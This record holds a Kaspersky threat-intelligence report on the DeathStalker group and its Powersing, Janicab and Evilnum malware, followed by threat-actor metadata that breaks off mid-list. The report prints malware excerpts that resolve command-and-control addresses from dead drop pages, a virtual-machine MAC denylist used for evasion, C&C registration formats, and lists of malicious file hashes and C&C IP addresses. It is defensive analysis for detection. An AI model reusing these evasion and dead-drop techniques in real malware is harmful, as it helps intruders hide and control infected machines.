{
    "id": "74cf5173-e914-43e3-9db7-5c7fe114f7d4",
    "created_at": "2023-01-12T15:06:46.991803Z",
    "updated_at": "2025-03-27T02:17:11.170096Z",
    "deleted_at": null,
    "sha1_hash": "5ce06bd4361d2f8b8145923c74281f71adaec827",
    "title": "2020-08-24 - Lifting the veil on DeathStalker, a mercenary triumvirate",
    "authors": "",
    "file_creation_date": "2022-05-28T04:50:10Z",
    "file_modification_date": "2022-05-28T04:50:10Z",
    "file_size": 733065,
    "plain_text": "# Lifting the veil on DeathStalker, a mercenary triumvirate\n\n**[securelist.com/deathstalker-mercenary-triumvirate/98177/](https://securelist.com/deathstalker-mercenary-triumvirate/98177/)**\n\nAuthors\n\n[Ivan Kwiatkowski](https://securelist.com/author/ivankwiatkowski/)\n\n[Pierre Delcher](https://securelist.com/author/pierredelcher/)\n\nMaher Yamout\n\nState-sponsored threat actors and sophisticated attacks are often in the spotlight. Indeed,\ntheir innovative techniques, advanced malware platforms and 0-day exploit chains capture\nour collective imagination. Yet these groups still aren’t likely to be a part of the risk model at\nmost companies, nor should they be. Businesses today are faced with an array of much\nmore immediate threats, from ransomware and customer information leaks, to competitors\nengaging in unethical business practices. In this blog post, we’ll be focusing on DeathStalker:\na unique threat group that appears to target law firms and companies in the financial sector\n(although we’ve occasionally seen them in other verticals as well). As far as we can tell, this\nactor isn’t motivated by financial gain. They don’t deploy ransomware, steal payment\ninformation to resell it, or engage in any type of activity commonly associated with the\n\n\n-----\n\ncybercrime underworld. Their interest in gathering sensitive business information leads us to\nbelieve that DeathStalker is a group of mercenaries offering hacking-for-hire services, or\nacting as some sort of information broker in financial circles.\n\nDeathStalker first came to our attention through a PowerShell-based implant called\n[Powersing. By unraveling this thread, we were able to identify activities dating back to 2018,](https://sec0wn.blogspot.com/2018/12/powersing-from-lnk-files-to-janicab.html)\nand possibly even 2012. But before we dive into a history of DeathStalker and possible links\nto known groups, we’ll start with a bit of background, beginning with this actor’s current\narsenal.\n\n## The Powersing toolchain\n\n### Overview\n\nRecent operations we attribute to this threat actor rely on the same intrusion vector: spearphishing emails with attached archives containing a malicious LNK file.\n\nDespite looking like documents from the Explorer or popular archive-extraction products, the\nshortcuts lead to cmd.exe. These shortcut files have the following structure:\n\n\n-----\n\nClicking them initiates a convoluted sequence resulting in the execution of arbitrary code on\nthe victim’s machine. A short PowerShell script, passed through cmd.exe’s arguments,\nbootstraps the following chain:\n\nStage 0’s role is to extract and execute the next element of the chain, as well as a\ndecoy document embedded inside the LNK file to display to the user. This creates the\nillusion of having clicked on a real document and ensures the victim doesn’t get\nsuspicious\n\n\n-----\n\nStage 1 is a PowerShell script containing C# assembly designed to connect to a dead\ndrop resolver (more on this in the next paragraph) and obtain cryptographic material\nused to decode the last stage of the chain by extracting a “DLL” file from the shortcut\nand locating a Base64-encoded list of URLs at a fixed offset. This establishes\npersistence by creating a shortcut (using the dropped icon) in the Windows startup\nfolder pointing to the VBE startup script.\nFinally, on stage 2, the actual malware implant used to take control of the victim’s\nmachine. It connects to one of the dead drop resolvers to get the address of the real\nC&C server and enters a loop that looks for orders every few seconds.\nUpon system restart, the VBE startup script – which closely resembles stage 0 – is\nautomatically executed, once again leading all the way to Powersing stage 2.\n\nCommunications with the C&C server involve the exchange of JSON-encoded objects.\nPowersing only has two tasks:\n\nCapture periodic screenshots from the victim’s machine, which are immediately sent to\nthe C&C server (two built-in commands allow operators to change screenshot quality\nand periodicity)\nExecute arbitrary Powershell scripts provided by the C&C\n\nOn stages 1 and 2, security software evasion is carried out with a high degree of variation\nacross the different samples we’ve analyzed. Depending on the AV detected on the machine,\nPowersing may opt for alternative persistence methods, or even stop running entirely. We\nsuspect that the group behind this toolset performs detection tests before each of their\ncampaigns and updates their scripts based on the results. This indicates an iterative and\nfast-paced approach to software design. It’s worth pointing out that stage 2 actively looks for\ntraces of virtualization (for example, vendor specific MAC addresses) and malware analysis\ntools on the machine, and reports this information to the C&C server.\n\nTo wrap up this section, we’d like to mention that Powersing isn’t a monolithic malware\nplatform. Instead, it’s a stealthy foothold inside the victim’s network with its key role to enable\nthe projection of further tools.\n\n### Dead drop resolvers\n\nThe DeathStalkers toolchain leverages a number of public services as dead drop resolvers.\nThese services provide a way for attackers to store data at a fixed URL through public posts,\ncomments, user profiles, content descriptions, etc. Messages left by the attackers follow the\nfollowing patterns: “My keyboard doesn’t work… [string].” and “Yo bro I sing [Base64\nencoded string] yeah”.\n\n\n-----\n\nDuring our investigation of this threat actor, we discovered such messages on:\n\nIn all likelihood, this list isn’t exhaustive. A number of these messages can be discovered\nthrough simple Google queries. Powersing’s first order of business is to connect to any dead\ndrop resolver it knows to retrieve this information. Stage 1 consumes the first string of these\nmessages, which contains the AES key used to decode stage 2. Then stage 2 connects to\nthe dead drop resolver to obtain the integer encoded in the second string. As the code\nexcerpt below shows, this integer is divided by an arbitrary constant (which varies depending\non the sample) before being converted to an IP address:\n\n\n-----\n\n1\n\n2\n\n3\n\n4\n\n5\n\n6\n\n7\n\n8\n\n9\n\n10\n\n11\n\n12\n\n13\n\n14\n\n15\n\n16\n\n17\n\n\npublic string LongToIP(string long_ip_string)\n\n{\n\nlong longIP;\n\nlong.TryParse(long_ip_string, out longIP);\n\nlongIP = longIP / 25835; // NB: divide integer by an arbitrary constant\n\nstring ip = string.Empty;\n\nfor (int i = 0; i < 4; i++)\n\n{\n\nint num = (int)(longIP / Math.Pow(256, (3 - i)));\n\nlongIP = longIP - (long)(num * Math.Pow(256, (3 - i)));\n\nif (i == 0)\n\nip = num.ToString();\n\nelse\n\nip = ip + \".\" + num.ToString();\n\n}\n\nreturn ip;\n\n}\n\n\nThis IP address is then stored on the user’s hard drive and used to establish a connection to\nthe real C&C server used by the operators to control Powersing. Relying on well-known\npublic services allows cybercriminals to blend initial backdoor communications into legitimate\nnetwork traffic. It also limits what defenders can do to hinder their operations, as these\nplatforms can’t generally be blocklisted at the company level, and getting content taken down\nfrom them can be a difficult and lengthy process. However, this comes at a price: the internet\nnever forgets, and it’s also difficult for cybercriminals to remove traces of their operations.\nThanks to the data indexed or archived by search engines, we estimate that Powersing was\nfirst used around August 2017.\n\nA final detail we’d like to mention is that a number of Powersing C&Cs we discovered had\nSSL certificates reminiscent of Sofacy’s infamous [Chopstick C&C “IT Department”](https://threatconnect.com/blog/using-fancy-bear-ssl-certificate-information-to-identify-their-infrastructure/)\ncertificates. We’re confident this infrastructure isn’t linked with Sofacy and believe this is an\nattempt by the threat actor to lead defenders to erroneous conclusions.\n\n\n-----\n\n## DeathStalker links to known groups\n\n### Janicab\n\nSec0wn’s original blog post introducing Powersing hinted at possible links with a malware\nfamily called Janicab, whose older samples date back to 2012. However, to the best of our\nknowledge, this connection was never explored publicly. Ultimately, we obtained one of the\n[malware samples listed by F-Secure in a 2015 blog post](https://archive.f-secure.com/weblog/archives/00002803.html)\n(1fe4c500c9f0f7630a6037e2de6580e9) on Janicab to look for similarities.\n\nThis file is another LNK pointing to cmd.exe that drops a VBE script on the system when\nclicked, as well as a decoy document. The script establishes a connection to an unlisted\nYouTube video to obtain C&C information embedded in the description:\n\nThe integer obtained on this page is then divided by a constant before being converted to an\nIP address:\n\n\n-----\n\n1\n\n2\n\n3\n\n4\n\n5\n\n6\n\n7\n\n8\n\n9\n\n10\n\n11\n\n12\n\n13\n\n14\n\n15\n\n\nSet objRE = New RegExp\n\nWith objRE\n\n.Pattern = \"our (.*)th psy anniversary\"\n\n.IgnoreCase = True\n\nEnd With\n\nSet objMatch = objRE.Execute( outputHTML )\n\nIf objMatch.Count = 1 Then\n\nserver = \"\"\n\nserver = objMatch.Item(0).Submatches(0)\n\nserver = server / 31337 'NB: divide integer by an arbitrary constant\n\n'msgbox(server)\n\nserver = IPConvert(server)\n\nserver = \"http://\" & server & \"/wp-admin-content\"\n\nEnd If\n\n\nWhile the use of YouTube as a dead drop resolver alone wouldn’t be sufficient to establish a\nlink between the two groups, we feel that the process of obtaining an integer somewhere\nonline and dividing it before interpreting it as an IP address is unique enough to draw a first\nconnection.\n\nJanicab’s features also remind us of Powersing’s: the sample contains VM detection based\non the MAC address of the machine, looks for malware analysis programs and has familiar\nantivirus software evasion routines. Janicab also periodically sends screenshot captures of\nthe victim’s desktop to the C&C and appears to enable the execution of arbitrary Python\nscripts.\n\nMore recent versions of Janicab (85ed6ab8f60087e80ab3ff87c15b1174) also involve\nnetwork traffic reminiscent of Powersing, especially when the malware registers with its C&C\nserver:\n\n\nPowersing\nregistration request\n(POST data)\n\n\nJanicab registration request\n\n\n-----\n\n{\n“un”: “[username]”,\n\n“cn”: “[computer\nname]”,\n\n“av”: “[installed AV\nprogram]”,\n\n“dob”: “[OS\ninstallation date]”,\n\n“os”: “[OS version]”,\n\n“ou”: “[campaign\nidentifier]”,\n\n“dc”: “[version]”\n\n}\n\n\nGET /gid.php?action=add&cn=[computer name]&un=\n\n[username]&v=[version]&av=[installed AV program]&an=\n\n[campaign identifier]\n\n\nIn addition, this sample contains the exact same list of denylisted VM MAC addresses as the\nPowersing sample introduced earlier in this post, in the same order.\n\nPowersing’s denylisted MAC addresses Janicab’s denylisted MAC addresses\n\nvirtual_mac_prefix.Add(“00015D”); macs(0) = “00-01-5D”\n\nvirtual_mac_prefix.Add(“0003BA”); macs(1) = “00-03-BA”\n\nvirtual_mac_prefix.Add(“000782”); macs(2) = “00-07-82”\n\nvirtual_mac_prefix.Add(“000F4B”); macs(3) = “00-0F-4B”\n\nvirtual_mac_prefix.Add(“00104F”); macs(4) = “00-10-4F”\n\nvirtual_mac_prefix.Add(“0010E0”); macs(5) = “00-10-E0”\n\nvirtual_mac_prefix.Add(“00144F”); macs(6) = “00-14-4F”\n\nvirtual_mac_prefix.Add(“0020F2”); macs(7) = “00-20-F2”\n\nvirtual_mac_prefix.Add(“002128”); macs(8) = “00-21-28”\n\nvirtual_mac_prefix.Add(“0021F6”); macs(9) = “00-21-F6”\n\nvirtual_mac_prefix.Add(“005056”); macs(10) = “00-50-56”\n\nvirtual_mac_prefix.Add(“000C29”); macs(11) = “00-0C-29”\n\nvirtual_mac_prefix.Add(“000569”); macs(12) = “00-05-69”\n\nvirtual_mac_prefix.Add(“0003FF”); macs(13) = “00-03-FF”\n\nvirtual_mac_prefix.Add(“001C42”); macs(14) = “00-1C-42”\n\nvirtual_mac_prefix.Add(“00163E”); macs(15) = “00-16-3E”\n\n\n-----\n\nvirtual_mac_prefix.Add(“080027”); macs(16) = “08-00-27”\n\nvirtual_mac_prefix.Add(“001C14”); macs(17) = “00-1C-14”\n\nvirtual_mac_prefix.Add(“080020”); macs(18) = “08-00-20”\n\nvirtual_mac_prefix.Add(“000D3A”); macs(19) = “00-0D-3A”\n\nvirtual_mac_prefix.Add(“00125A”); macs(20) = “00-12-5A”\n\nvirtual_mac_prefix.Add(“00155D”); macs(21) = “00-15-5D”\n\nvirtual_mac_prefix.Add(“0017FA”); macs(22) = “00-17-FA”\n\nvirtual_mac_prefix.Add(“001DD8”); macs(23) = “00-1D-D8”\n\nvirtual_mac_prefix.Add(“002248”); macs(24) = “00-22-48”\n\nvirtual_mac_prefix.Add(“0025AE”); macs(25) = “00-25-AE”\n\nvirtual_mac_prefix.Add(“0050C2”); macs(26) = “00-50-C2”\n\nvirtual_mac_prefix.Add(“0050F2”); macs(27) = “00-50-F2”\n\nvirtual_mac_prefix.Add(“444553”); macs(28) = “44-45-53”\n\nvirtual_mac_prefix.Add(“7CED8D”); macs(29) = “7C-ED-8D”\n\n### Evilnum\n\nAnother possible connection worth investigating concerns the more recent Evilnum malware\n[family, which was the subject of an in-depth blog post from ESET last July, as well as a](https://www.welivesecurity.com/2020/07/09/more-evil-deep-look-evilnum-toolset/)\ncouple of our own private reports. ESET’s post details another LNK-based infection chain\nleading to the execution of Javascript-based malware. Again, we obtained an old Evilnum\nsample (219dedb53da6b1dce0d6c071af59b45c) and observed that it also obtained C&C\ninformation from a dead drop resolver (GitHub) to obtain an IP address converted with the\nfollowing code:\n\n\n-----\n\n1\n\n2\n\n3\n\n4\n\n5\n\n6\n\n7\n\n8\n\n9\n\n10\n\n11\n\n12\n\n13\n\n14\n\n15\n\n16\n\n17\n\n18\n\n19\n\n20\n\n\nfunction extract_srvaddr() {\n\nserverFound = false;\n\npattern = 'our news start at (.*) thank you';\n\nwhile(serverFound == false) {\n\nvar item = items[Math.floor(Math.random()*items.length)];\n\nvar html = get_page_content_with_ie(item,'');\n\nif(html != '') {\n\nvar match = extract_string(pattern, html);\n\nif(match != null) {\n\nsrv = num2dot(match[1]/666); // NB: divide integer by a constant\n\nsrv = srv + \"/Validate\";\n\nsrv_stat = get_page_content_with_ie(srv+\"/ValSrv\", '');\n\nvalidate_str = extract_string('youwillnotfindthisanywhare', srv_stat);\n\nif(validate_str == 'youwillnotfindthisanywhare') {\n\nserverFound = true;\n\nreturn srv;\n\n}\n\n}\n\n}\n\n}\n\n\nWe can’t help but notice the pattern of looking for a specific string using a regular expression\nto obtain an integer, then dividing this integer by a constant resulting in the IP address of the\nC&C server. While Evilnum provides more capabilities than Powersing, it can also capture\nscreenshots and send them to the C&C server.\n\nIn terms of victimology, Evilnum focuses on companies in the Fintech sector. It appears to be\nmore interested in business intelligence than financial gain. This is consistent with the\nDeathStalker activity we’ve observed thus far.\n\n\n-----\n\nOne final connection we want to mention is that recent Evilnum\n(835d94b0490831da27d9bf4e9f4b429c) and Janicab samples have some slight code\noverlaps, despite being written in different languages:\n\nVariables with similar names (“ieWatchdogFilename” for Janicab, “ieWatchdogPath” for\nEvilnum) used in functions performing equivalent tasks\nTwo functions used for cleanup have identical names: “deleteLeftOvers”\n\nWe feel that these names are unique enough to create an additional link between the two\nmalware families. Less conclusively, this Evilnum sample also contains a function called\n“long2ip” to convert integers to IP addresses, while Powersing contains a similar\nimplementation under the “LongToIP” name.\n\n### Summary\n\nPowersing, Janicab and Evilnum are three scripting language-based toolchains exhibiting the\nfollowing similarities:\n\nAll three are distributed through LNK files contained in archives delivered through\nspear-phishing\nThey obtain C&C information from dead drop resolvers using regular expressions and\nhardcoded sentences\nIP addresses are obtained in the form of integers that are then divided by a hardcoded\nconstant before being converted\nMinor code overlaps between the three malware families could indicate that they’ve\nbeen developed by the same team, or inside a group that shares software development\npractices\nThe three malware families all have screenshot capture capabilities. While not original\nin itself, this isn’t usually part of the development priorities of such groups and could be\nindicative of a shared design specification\nFinally, while we don’t have a lot of information about Janicab’s victimology, Powersing\nand Evilnum both go after business intelligence, albeit in different industry verticals.\nBoth sets of activities are consistent with the hypothesis that they’re run by a\nmercenary outfit\n\nWhile none of these points on their own are sufficient in our eyes to draw a conclusion, we\nfeel that together they allow us to assess with medium confidence that Powersing, Evilnum\n**and Janicab are operated by the same group. Additional data shared with us by industry**\npartners that we can’t disclose at the moment also supports this conclusion.\n\n## Victimology\n\n\n-----\n\nDeathStalker primarily targets private entities in the financial sector, including law offices,\nwealth consultancy firms, financial technology companies, and so on. In one unique\ninstance, we also observed DeathStalker attacking a diplomatic entity.\n\nWe’ve been able to identify Powersing-related activities in Argentina, China, Cyprus, Israel,\nLebanon, Switzerland, Taiwan, Turkey, the United Kingdom and the United Arab Emirates.\nWe also located Evilnum victims in Cyprus, India, Lebanon, Russia, Jordan and the United\nArab Emirates.\n\nHowever, we believe that DeathStalkers chooses its targets purely based on their perceived\nvalue, or perhaps following customer requests. In this context, we assess that any company\nin the financial sector could catch DeathStalker’s attention, no matter its geographic location.\n\n## Conclusion\n\nIn this blog post, we described a modern infection chain that’s still actively used and\ndeveloped by a threat actor today. It doesn’t contain any innovative tricks or sophisticated\nmethods, and certain components of the chain may actually appear needlessly convoluted.\nYet if the hypothesis is correct that the same group operates Janicab and Powersing, it\nindicates that they’ve been leveraging the same methodologies since 2012. In the infosec\nworld, it doesn’t get more “tried and true” than this.\n\n\n-----\n\nBased on the limited technological means either of these toolchains display, we believe\nthey’re good examples of what small groups or even skilled individuals can create. The value\nwe see in publicly releasing information about DeathStalker is to have this threat actor serve\nas a baseline of what the private sector should be able to defend against. Groups like\nDeathStalker represent the type of cyberthreat most companies today are likely to face more\nthan state-sponsored APTs. Due to its ongoing operations (DeathStalker notably leveraged\nCOVID-19 for both Janicab and Powersing implant deployment since March 2020) and\ncontinuous activity since 2018, we believe that DeathStalker is still developing its toolset, and\nthat we’ll have more to report on in the near future.\n\nWe advise defenders to pay close attention to any process creation related to native\nWindows interpreters for scripting languages, such as powershell.exe and cscript.exe.\nWherever possible, these utilities should be made unavailable. We also recommend that\nfuture awareness trainings and security product assessments include infection chains based\non LNK files.\n\nFor more information about both DeathStalker and Evilnum activity, subscribe to our private\n[reporting services: intelreports@kaspersky.com](http://10.10.0.46/mailto:intelreports@kaspersky.com)\n\n## Indicators of Compromise\n\n**File hashes**\n\n[D330F1945A39CEB78B716C21B6BE5D82](https://opentip.kaspersky.com/D330F1945A39CEB78B716C21B6BE5D82/) Malicious LNK\n\n[D83F933B2A6C307E17438749EDA29F02](https://opentip.kaspersky.com/D83F933B2A6C307E17438749EDA29F02/) Malicious LNK\n\n[540BC05130424301A8F0543E0240DF1D](https://opentip.kaspersky.com/540BC05130424301A8F0543E0240DF1D/) Malicious LNK\n\n[3B359A0E279C4E8C5B781E0518320B46](https://opentip.kaspersky.com/3B359A0E279C4E8C5B781E0518320B46/) Malicious LNK\n\n[6F965640BC609F9C5B7FEA181A2A83CA](https://opentip.kaspersky.com/6F965640BC609F9C5B7FEA181A2A83CA/) Malicious LNK\n\n[E1718289718792651FA401C945C17079](https://opentip.kaspersky.com/E1718289718792651FA401C945C17079/) Malicious LNK\n\n[F558E216CD3FB6C23696240A8C6306AC](https://opentip.kaspersky.com/F558E216CD3FB6C23696240A8C6306AC/) Malicious LNK\n\n[B38D1C18CBCCDDDBF56FDD28E5E6ECBB](https://opentip.kaspersky.com/B38D1C18CBCCDDDBF56FDD28E5E6ECBB/) Loader Script\n\n[E132C596857892AC41249B90EA6934C1](https://opentip.kaspersky.com/E132C596857892AC41249B90EA6934C1/) PowerSing Stage 1\n\n[9A0F56CDACCE40D7039923551EAB241B](https://opentip.kaspersky.com/9A0F56CDACCE40D7039923551EAB241B/) PowerSing Stage 1\n\n[0CEBEB05362C0A5665E7320431CD115A](https://opentip.kaspersky.com/0CEBEB05362C0A5665E7320431CD115A/) PowerSing Stage 1\n\n[C5416D454C4A2926CA6128E895224981](https://opentip.kaspersky.com/C5416D454C4A2926CA6128E895224981/) PowerSing Stage 1\n\n[DBD966532772DC518D818A3AB6830DA9](https://opentip.kaspersky.com/DBD966532772DC518D818A3AB6830DA9/) PowerSing Stage 1\n\n\n-----\n\n[B7BBA5E70DC7362AA00910443FB6CD58](https://opentip.kaspersky.com/B7BBA5E70DC7362AA00910443FB6CD58/) PowerSing Stage 1\n\n[2BE3E8024D5DD4EB9F7ED45E4393992D](https://opentip.kaspersky.com/2BE3E8024D5DD4EB9F7ED45E4393992D/) PowerSing Stage 1\n\n[83D5A68BE66A66A5AB27E309D6D6ECD1](https://opentip.kaspersky.com/83D5A68BE66A66A5AB27E309D6D6ECD1/) PowerSing Stage 1\n\n[50D763EFC1BE165B7DB3AB5D00FFACD8](https://opentip.kaspersky.com/50D763EFC1BE165B7DB3AB5D00FFACD8/) PowerSing Stage 1\n\n**C&C servers**\n\n54.38.192.174 Powersing C&C\n\n91.229.76.17 Powersing C&C\n\n91.229.76.153 Powersing C&C\n\n91.229.77.240 Powersing C&C\n\n91.229.77.120 Powersing C&C\n\n91.229.79.120 Powersing C&C\n\n54.38.192.174 Powersing C&C\n\n105.104.10.115 Powersing C&C\n\n[Cybercrime](https://securelist.com/tag/cybercrime/)\n[Malware Descriptions](https://securelist.com/tag/malware-descriptions/)\n[Malware Technologies](https://securelist.com/tag/malware-technologies/)\n[Spear phishing](https://securelist.com/tag/spear-phishing/)\n[Targeted attacks](https://securelist.com/tag/targeted-attacks/)\n\nAuthors\n\n[Ivan Kwiatkowski](https://securelist.com/author/ivankwiatkowski/)\n\n[Pierre Delcher](https://securelist.com/author/pierredelcher/)\n\nMaher Yamout\n\nLifting the veil on DeathStalker, a mercenary triumvirate\n\nYour email address will not be published. Required fields are marked *\n\n\n-----",
    "language": "EN",
    "sources": [
        {
            "id": "05d7b179-7656-44d8-a74c-9ab34d3df3a2",
            "created_at": "2023-01-12T14:38:44.599904Z",
            "updated_at": "2023-01-12T14:38:44.599904Z",
            "deleted_at": null,
            "name": "VXUG",
            "url": "https://www.vx-underground.org",
            "description": "vx-underground Papers",
            "reports": null
        }
    ],
    "references": [
        "https://papers.vx-underground.org/papers/Malware Defense/Malware Analysis 2020/2020-08-24 - Lifting the veil on DeathStalker, a mercenary triumvirate.pdf"
    ],
    "report_names": [
        "2020-08-24 - Lifting the veil on DeathStalker, a mercenary triumvirate.pdf"
    ],
    "threat_actors": [
        {
            "id": "059b16f8-d4e0-4399-9add-18101a2fd298",
            "created_at": "2022-10-25T15:50:23.29434Z",
            "updated_at": "2025-03-27T02:00:55.431907Z",
            "deleted_at": null,
            "main_name": "Evilnum",
            "aliases": [
                "Evilnum"
            ],
            "source_name": "MITRE:Evilnum",
            "tools": [
                "More_eggs",
                "EVILNUM",
                "LaZagne"
            ],
            "source_id": "MITRE",
            "reports": null
        },
        {
            "id": "f7aa6029-2b01-4eee-8fe6-287330e087c9",
            "created_at": "2022-10-25T16:07:23.536763Z",
            "updated_at": "2025-03-27T02:02:09.85219Z",
            "deleted_at": null,
            "main_name": "Deceptikons",
            "aliases": [
                "DeathStalker",
                "Deceptikons"
            ],
            "source_name": "ETDA:Deceptikons",
            "tools": [
                "EVILNUM",
                "Evilnum",
                "Janicab",
                "PowerPepper",
                "Powersing",
                "VileRAT"
            ],
            "source_id": "ETDA",
            "reports": null
        },
        {
            "id": "39ea99fb-1704-445d-b5cd-81e7c99d6012",
            "created_at": "2022-10-25T16:07:23.601894Z",
            "updated_at": "2025-03-27T02:02:09.882982Z",
            "deleted_at": null,
            "main_name": "Evilnum",
            "aliases": [
                "Jointworm",
                "Operation Phantom in the [Command] Shell",
                "TA4563"
            ],
            "source_name": "ETDA:Evilnum",
            "tools": [
                "Bypass-UAC",
                "Cardinal RAT",
                "ChromeCookiesView",
                "EVILNUM",
                "Evilnum",
                "IronPython",
                "LaZagne",
                "MailPassView",
                "More_eggs",
                "ProduKey",
                "PyVil",
                "PyVil RAT",
                "SONE",
                "SpicyOmelette",
                "StealerOne",
                "Taurus Loader Stealer Module",
                "Taurus Loader TeamViewer Module",
                "Terra Loader",
                "TerraPreter",
                "TerraStealer",
                "TerraTV"
            ],
            "source_id": "ETDA",
            "reports": null
        },
        {
            "id": "d90307b6-14a9-4d0b-9156-89e453d6eb13",
            "created_at": "2022-10-25T16:07:23.773944Z",
            "updated_at": "2025-03-27T02:02:09.974695Z",
            "deleted_at": null,
            "main_name": "Lead",
            "aliases": [
                "Casper",
                "TG-3279"
            ],
            "source_name": "ETDA:Lead",
            "tools": [
                "Agentemis",
                "BleDoor",
                "Cobalt Strike",
                "CobaltStrike",
                "RbDoor",
                "RibDoor",
                "Winnti",
                "cobeacon"
            ],
            "source_id": "ETDA",
            "reports": null
        },
        {
            "id": "dfee8b2e-d6b9-4143-a0d9-ca39396dd3bf",
            "created_at": "2022-10-25T16:07:24.467088Z",
            "updated_at": "2025-03-27T02:02:10.241387Z",
            "deleted_at": null,
            "main_name": "Circles",
            "aliases": [],
            "source_name": "ETDA:Circles",
            "tools": [],
            "source_id": "ETDA",
            "reports": null
        },
        {
            "id": "8ce861d7-7fbd-4d9c-a211-367c118bfdbd",
            "created_at": "2023-01-06T13:46:39.153487Z",
            "updated_at": "2025-03-27T02:00:03.009422Z",
            "deleted_at": null,
            "main_name": "Evilnum",
            "aliases": [
                "TA4563",
                "EvilNum",
                "Jointworm",
                "KNOCKOUT SPIDER",
                "DeathStalker"
            ],
            "source_name": "MISPGALAXY:Evilnum",
            "tools": [],
            "source_id": "MISPGALAXY",
            "reports": null
        },
        {
            "id": "e3767160-695d-4360-8b2e-d5274db3f7cd",
            "created_at": "2022-10-25T16:47:55.914348Z",
            "updated_at": "2025-03-27T02:05:17.411172Z",
            "deleted_at": null,
            "main_name": "IRON TWILIGHT",
            "aliases": [
                "ATK5 ",
                "Blue Athena ",
                "BlueDelta ",
                "FROZENLAKE ",
                "Fancy Bear ",
                "Fighting Ursa ",
                "Forest Blizzard ",
                "GRAPHITE ",
                "Group 74 ",
                "PawnStorm ",
                "STRONTIUM ",
                "Sednit ",
                "Snakemackerel ",
                "Sofacy ",
                "TG-4127 ",
                "Tsar Team ",
                "APT28 "
            ],
            "source_name": "Secureworks:IRON TWILIGHT",
            "tools": [
                " Downdelph",
                " Drovorub",
                " EVILTOSS",
                " HIDEDRV",
                " Headlace",
                " LoJack",
                " Powershell Empire",
                " SCONATO",
                " SEDUPLOADER",
                " SHARPFRONT",
                " Scaramouche",
                " Sedkit Exploit Kit",
                " Sofacy downloader",
                " X-Agent",
                " X-Tunnel",
                " Zebrocy",
                " reGeorg",
                "DEALERSCHOICE"
            ],
            "source_id": "Secureworks",
            "reports": null
        },
        {
            "id": "730dfa6e-572d-473c-9267-ea1597d1a42b",
            "created_at": "2023-01-06T13:46:38.389985Z",
            "updated_at": "2025-03-27T02:00:02.821388Z",
            "deleted_at": null,
            "main_name": "APT28",
            "aliases": [
                "FROZENLAKE",
                "BlueDelta",
                "SNAKEMACKEREL",
                "TG-4127",
                "ITG05",
                "TA422",
                "Fancy Bear",
                "FANCY BEAR",
                "Sednit",
                "IRON TWILIGHT",
                "G0007",
                "Sofacy",
                "Forest Blizzard",
                "GruesomeLarch",
                "Pawn Storm",
                "Tsar Team",
                "STRONTIUM",
                "ATK5",
                "Blue Athena",
                "APT-C-20",
                "Group 74",
                "SIG40",
                "Grizzly Steppe",
                "Fighting Ursa",
                "T-APT-12",
                "UAC-0028"
            ],
            "source_name": "MISPGALAXY:APT28",
            "tools": [],
            "source_id": "MISPGALAXY",
            "reports": null
        },
        {
            "id": "ae320ed7-9a63-42ed-944b-44ada7313495",
            "created_at": "2022-10-25T15:50:23.671663Z",
            "updated_at": "2025-03-27T02:00:55.518748Z",
            "deleted_at": null,
            "main_name": "APT28",
            "aliases": [
                "APT28",
                "IRON TWILIGHT",
                "SNAKEMACKEREL",
                "Group 74",
                "Sednit",
                "Sofacy",
                "Pawn Storm",
                "Fancy Bear",
                "STRONTIUM",
                "Tsar Team",
                "Threat Group-4127",
                "TG-4127",
                "Forest Blizzard",
                "FROZENLAKE"
            ],
            "source_name": "MITRE:APT28",
            "tools": [
                "Wevtutil",
                "certutil",
                "Forfiles",
                "DealersChoice",
                "Mimikatz",
                "ADVSTORESHELL",
                "Komplex",
                "HIDEDRV",
                "JHUHUGIT",
                "Koadic",
                "Winexe",
                "XTunnel",
                "Drovorub",
                "CORESHELL",
                "OLDBAIT",
                "Downdelph",
                "XAgentOSX",
                "USBStealer",
                "Zebrocy",
                "Fysbis",
                "LoJax"
            ],
            "source_id": "MITRE",
            "reports": null
        },
        {
            "id": "f9806b99-e392-46f1-9c13-885e376b239f",
            "created_at": "2023-01-06T13:46:39.431871Z",
            "updated_at": "2025-03-27T02:00:03.08926Z",
            "deleted_at": null,
            "main_name": "Watchdog",
            "aliases": [
                "Thief Libra"
            ],
            "source_name": "MISPGALAXY:Watchdog",
            "tools": [],
            "source_id": "MISPGALAXY",
            "reports": null
        },
        {
            "id": "d2516b8e-e74f-490d-8a15-43ad6763c7ab",
            "created_at": "2022-10-25T16:07:24.212584Z",
            "updated_at": "2025-03-27T02:02:10.141001Z",
            "deleted_at": null,
            "main_name": "Sofacy",
            "aliases": [
                "APT 28",
                "ATK 5",
                "Blue Athena",
                "BlueDelta",
                "FROZENLAKE",
                "Fancy Bear",
                "Fighting Ursa",
                "Forest Blizzard",
                "Grey-Cloud",
                "Grizzly Steppe",
                "Group 74",
                "GruesomeLarch",
                "ITG05",
                "Iron Twilight",
                "Operation DealersChoice",
                "Operation Dear Joohn",
                "Operation Komplex",
                "Operation Pawn Storm",
                "Operation Russian Doll",
                "Operation Steal-It",
                "Pawn Storm",
                "SIG40",
                "Sednit",
                "Snakemackerel",
                "Sofacy",
                "Strontium",
                "T-APT-12",
                "TA422",
                "TAG-0700",
                "TAG-110",
                "TG-4127",
                "Tsar Team",
                "UAC-0028",
                "UAC-0063"
            ],
            "source_name": "ETDA:Sofacy",
            "tools": [
                "ADVSTORESHELL",
                "AZZY",
                "Backdoor.SofacyX",
                "CHERRYSPY",
                "CORESHELL",
                "Carberp",
                "Computrace",
                "DealersChoice",
                "Delphacy",
                "Downdelph",
                "Downrage",
                "Drovorub",
                "EVILTOSS",
                "Foozer",
                "GAMEFISH",
                "GooseEgg",
                "Graphite",
                "HATVIBE",
                "HIDEDRV",
                "Headlace",
                "Impacket",
                "JHUHUGIT",
                "JKEYSKW",
                "Koadic",
                "Komplex",
                "LOLBAS",
                "LOLBins",
                "Living off the Land",
                "LoJack",
                "LoJax",
                "MASEPIE",
                "Mimikatz",
                "NETUI",
                "Nimcy",
                "OCEANMAP",
                "OLDBAIT",
                "PocoDown",
                "PocoDownloader",
                "Popr-d30",
                "ProcDump",
                "PythocyDbg",
                "SMBExec",
                "SOURFACE",
                "SPLM",
                "STEELHOOK",
                "Sasfis",
                "Sedkit",
                "Sednit",
                "Sedreco",
                "Seduploader",
                "Shunnael",
                "SkinnyBoy",
                "Sofacy",
                "SofacyCarberp",
                "SpiderLabs Responder",
                "Trojan.Shunnael",
                "Trojan.Sofacy",
                "USB Stealer",
                "USBStealer",
                "VPNFilter",
                "Win32/USBStealer",
                "WinIDS",
                "Winexe",
                "X-Agent",
                "X-Tunnel",
                "XAPS",
                "XTunnel",
                "Xagent",
                "Zebrocy",
